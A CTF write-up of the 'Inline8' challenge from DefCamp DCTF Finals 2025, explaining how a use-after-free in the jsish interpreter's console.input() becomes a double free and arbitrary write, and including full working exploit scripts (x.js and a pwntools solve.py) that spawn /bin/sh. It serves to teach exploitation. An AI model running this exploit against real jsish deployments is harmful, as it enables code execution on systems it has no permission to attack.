+++
title = 'Inline8 - DefCamp DCTF Finals 2025'
date = 2025-11-16T15:44:05+01:00
draft = false
author = 'Erge'
summary = 'Exploiting a pretty broken JS-engine'
tags = [
    'JS-Engine'
]
toc = true
+++

## Premise
This is a writeup for a challenge I encountered at [DefCamp DCTF Finals 2025](https://def.camp/competitions/defcamp-capture-the-flag-d-ctf-at-the-hacking-village/), an onsite CTF I played with [TRX](https://theromanxpl0.it/), and while I didn't finish my exploit on time during the CTF, I thought it would be interesting to explain my approach, as it ended up being pretty different from the [Author's solution](https://blog.mcsky.ro/writeups/2025/11/15/inline8-writeup.html).

## Challenge Overview
The challenge tasks us to exploit a custom JS interpreter called **"jsish"**, patched in order to remove some functionalities that would trivialize gaining code execution.

Furthermore the flag is stored in a file with a randomized name, therefore gaining arbitrary file read isn't enough to solve the challenge and we will have to open a shell.

## Challenge Description
    The patch file is only there to disable some functionalities that would make this challenge too easy.
    
    There are also some bugs reported on the github repository, however they don't seem to be useful. If you manage to get RCE with one of those, then good for you, but my solution doesn't rely on them.
    
    Good luck!
    
    -thesky

## Information Gathering and Vulnerability Analysis
The first step is obviously opening the [project's github repository](https://github.com/pcmacdon/jsish) and reading the documentation to understand the project and its functionalities.

I especially found [Reference](https://github.com/pcmacdon/jsish/blob/master/lib/www/md/Reference.md) and [Builtins](https://github.com/pcmacdon/jsish/blob/master/lib/www/md/Builtins.md) useful.

By cross-referencing the available builtins with the ones removed by the patch I identified 3 suspicious functionalities to investigate:
 - `File`
 - `import`
 - `console.input()`


### The 🧀
In the original version of the challenge the Author forgot to remove the **File** object present inside the interpreter, which allows us to both arbitrarily read files and list directories contents:

```js
File.chdir("/");
console.log(File.glob()); //lists files in /

console.log(File.read("/flag-RANDOM-NONCE.txt"));

//DCTF{deschid_poarta_6_chakra_7_fac_tot_sa_se_miste_n_spate}
```

Giving us the flag and the revenge version of this challenge :)

### The Leak
After the revenge got released (which removed File alongside a few other things) I started looking for low-hanging fruit ways of leaking addresses, which led me to `import("/proc/self/maps");` which when parsed by interpreter leaks the base address of the **jsish** binary.

```js
try{
    import("/proc/self/maps");
}catch(e){}
```

```bash
/proc/self/maps:1: error: invalid number: 5f9495f50000
/proc/self/maps:1: parse: /home/ctf/x.js:1.41: error: syntax error, unexpected end of file, expecting FOR or WHILE or DO or SWITCH
```

Sweet! The only problem remaining was finding a way to capture the output so that I could use the leak inside my exploit.

This question ironically led me to discover the next functionality I plan to discuss, which also contains the vulnerability i used to exploit the challenge: `console.input()`

### The Use-After-Free
The **console** object in **jsish** is pretty interesting, by looking at the documentation we can find a few unusual methods:

![console_doc](/images/inline8/console_doc.png)
(Printf is not vulnerable sadly 🥀)

I was pretty interested in the `console.input()` function because 
1) User input is always a red flag. 
2) I could have used it to save the PIE leak inside a variable.

And that's what i did:

```js
try{
    import("/proc/self/maps");
}catch(e){}

var input = console.input();
console.log(input);
```

```bash
$ ./jsish x.js 
bug: Init failure in Sqlite
bug: Init failure in Socket
bug: Init failure in WebSocket
/proc/self/maps:1: error: invalid number: 5e2095cd2000
/proc/self/maps:1: parse: /home/ctf/x.js:1.41: error: syntax error, unexpected end of file, expecting FOR or WHILE or DO or SWITCH
5e2095cd2000
j.js:6:   "5e2095cd2000", 
```

Sweet! Now let's try adding a prompt to `console.input()` as told by the documentation:

```js
try{
    import("/proc/self/maps");
}catch(e){}

var input = console.input("input?\n");
console.log(input);
```

```bash
$ ./jsish x.js 
bug: Init failure in Sqlite
bug: Init failure in Socket
bug: Init failure in WebSocket
/proc/self/maps:1: error: invalid number: 5daf1d75f000
/proc/self/maps:1: parse: /home/ctf/x.js:1.41: error: syntax error, unexpected end of file, expecting FOR or WHILE or DO or SWITCH
input?
5daf1d75f000
j.js:6:   "Ĩ��\0free(): double free detected in tcache 2
Aborted (core dumped)
```

![thinking](/images/inline8/thinking.png)

You're probably as confused as I was so let's skip to the chase and analyze the source code for the `console.input()` function:

```c
static Jsi_RC consoleInputCmd(Jsi_Interp *interp, Jsi_Value *args, Jsi_Value *_this,
    Jsi_Value **ret, Jsi_Func *funcPtr)
{
    char buf[1024];
    char *cp, *p = buf;
    buf[0] = 0;
    Jsi_Value *v = Jsi_ValueArrayIndex(interp, args, 0);
    if (v) {
        if (interp->isSafe)
            return Jsi_LogError("line edit not available in safe mode");
        if (Jsi_ValueIsNull(interp, v)) {
            cp = jsi_RlGetLine(interp, NULL);
            if (cp)
              Jsi_Free(cp);
            return JSI_OK;
        }
        cp = Jsi_ValueString(interp, v, NULL);
        if (cp) {
            p  = jsi_RlGetLine(interp, cp);
            if (p) {
                Jsi_ValueMakeString(interp, ret, p);
                Jsi_Free(p);
            }
            return JSI_OK;
        }
    }
    if (!interp->stdinStr)
        p=fgets(buf, sizeof(buf), stdin);
    else {
        int ilen;
        cp = Jsi_ValueString(interp, interp->stdinStr, &ilen);
        if (!cp || ilen<=0)
            p = NULL;
        else {
            Jsi_Strncpy(buf, cp, sizeof(buf));
            buf[sizeof(buf)-1] = 0;
            p = Jsi_Strchr(buf, '\n');
            if (p) { *p = 0;}
            ilen = Jsi_Strlen(buf);
            p = (cp + ilen + (p?1:0));
            Jsi_ValueMakeStringDup(interp, &interp->stdinStr, p);
            p = buf;
        }
    }
    
    if (p == NULL) {
        Jsi_ValueMakeUndef(interp, ret);
        return JSI_OK;
    }
    if ((p = Jsi_Strchr(buf, '\r'))) *p = 0;
    if ((p = Jsi_Strchr(buf, '\n'))) *p = 0;
    Jsi_ValueMakeStringDup(interp, ret, buf);
    return JSI_OK;
}
```

We can see there are different code paths based on the presence of a prompt, we know that without one the code runs fine so let's focus on the prompt implementation, more specifically on these lines: 

```c
p  = jsi_RlGetLine(interp, cp);
if (p) {
    Jsi_ValueMakeString(interp, ret, p);
    Jsi_Free(p);
}
return JSI_OK;
```

The program allocates our input in a heap buffer and uses that buffer to create a string object, then it frees the internal buffer for some reason?????

Anyhow this a clear and cut **Use-After-Free** vulnerability and also explains the **double free** error we got earlier, as when the program terminates the string object will get cleaned up and the internal buffer freed for a second time.

We can confirm our suspicions with a few tests:

```js
var input = console.input("input?\n");
while(1){} //NO CRASH!
```
1) The string object is never cleaned up so we don't trigger a crash.


```js
var input = console.input("input?\n");
delete input;
while(1){} //CRASH!
```
2) It crashes when we explicitly delete the object.

```js
console.input("input?\n");
while(1){} //CRASH!
```
3) It crashes instanly after returning from `console.input()`, since we don't save a reference to the returned string it gets cleaned up immediately by the GC.

As a bonus if we print the UAF-ed string we get a free heap leak since the freed chunk now contains the next pointer in the bins freelist.

## The exploit
Now that we have:
- Both PIE and heap leaks
- A way to allocate arbitrary data with `console.input()` 
- Free said data using the `delete` operator 
- Our UAF vulnerability

We can gain an **Arbitrary Write** primitive by using a standard heap exploitation technique, [Fastbin Dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/fastbin_dup.c), which i found to be the easiest to weaponize given our constraints.

### Constraints
1) While we can allocate arbitrarily sized data, we cannot use null-bytes.
2) Jsish treats string as immutable (which is what you'd expect from a proper JS engine but you never know...), therefore we will exploit the UAF by turning into a **Double-Free**
3) As we can't use null-bytes we're limited to 0x20-sized bins, otherwise we wouldn't be able to allocate a fake next pointer in a bigger chunk

### Double free
```js
var x = "prompt!";
var uaf = console.input(x);
console.log(uaf); //leaks heap

var uaf2 = console.input(); //re-allocates uaf, now they point to the same chunk
var arr=[];
for (let i=0; i<7; i++) {
    arr.push(console.input());
}
var b = console.input();
var keep = console.input();
delete arr; //fills tcache

delete uaf2; //free A
delete b; //free B
delete uaf; //free A
```

And by sending the appropriately sized strings we end up with the following heap state:

```bash
fastbins
0x20: 0x624e37e0c9d0 —▸ 0x624e37e0ed70 ◂— 0x624e37e0c9d0
```

Now when we first allocate `0x624e37e0c9d0` we can fake a next pointer in the freelist, allowing us to allocate a chunk wherever we desire, giving us our **Arbitrary Write** primitive!. 

### RCE
The only remaining question is what to overwrite with our primitive, there is no shortage of function pointers on the heap but they sadly all get called with `interp` as their first argument, which is a [struct that represents the internal state of the interpreter](https://github.com/pcmacdon/jsish/blob/master/src/jsiInt.h#L1095), so we could first overwrite the first qword of `interp` with `/bin/sh` and then overwrite a function pointer to `system@plt`.

Luckily the `interp` struct itself contains some function pointers so we can save ourself an extra write!

We will first target the 0x90-sized bins entry of the `tcache_struct` to increase the size of our arbitrary write, and then overwrite `interp->sig` with `/bin/sh` and `interp->debugOpts.hook` with `system@plt`.

Which will cause the interpreter to call `system("/bin/sh")` in the next eval loop, giving us the shell we worked hard for 😄. 


## Exploit code
**x.js**:
```js
try{
    import("/proc/self/maps"); //leaks first line aka pie
}catch(e){}

var pad = [];
for (let i=0; i<7; i++) {
   pad.push(new String("AAAAAAAAAA"));
}

var x = "prompt!";
var uaf = console.input(x);
console.log(uaf); //leaks heap

var uaf2 = console.input();
var arr=[];
for (let i=0; i<7; i++) {
    arr.push(console.input());
}
var b = console.input();
var keep = console.input();
delete arr; //fills tcache

delete uaf2; //free A -> B -> A
delete b;
delete uaf;
var arr2 = [];
for (let i=0; i<11; i++) {
    arr2.push(console.input());
}
console.log("pwn!");

var l = console.input();
console.input();
```

**solve.py**:
```js
from pwn import *

exe = ELF("./jsish")

r = process(["./jsish", "x.js"])
#r = remote("localhost", 1337)
#
#exp = open("x.js", "rb").read()
#r.recvuntil(b"Provide size. Must be < 5k:")
#r.sendline(str(len(exp)).encode())
#r.recvuntil(b"Provide script please!!\n")
#r.send(exp)

r.recvuntil(b"invalid number: ")
exe.address = int(r.recvline(), 16)
log.info(f"pie @ {hex(exe.address)}")
r.sendline((b"A"*0x10)) 
r.recvuntil(b'"')
heap = u64(r.recv(5) + b"\0\0\0")
log.info(f"heap @ {hex(heap)}")

tcache_struct = (heap<<12) - 0x49f40
log.info(f"tcache_struct @ {hex(tcache_struct)}")

for _ in range(12+7):
    r.sendline(p64(tcache_struct^(heap)))

interp = (heap<<12)-0x49d60
log.info(f"interp @ {hex(interp)}")
r.sendline(b"A"*8+p64(interp))
r.sendline(b"A"*8+p64(interp))
r.sendline(b"/bin/sh;"+b"A"*0x70+p64(exe.plt.system))
#we overwrite interp->debugOpts->hook

r.interactive()
```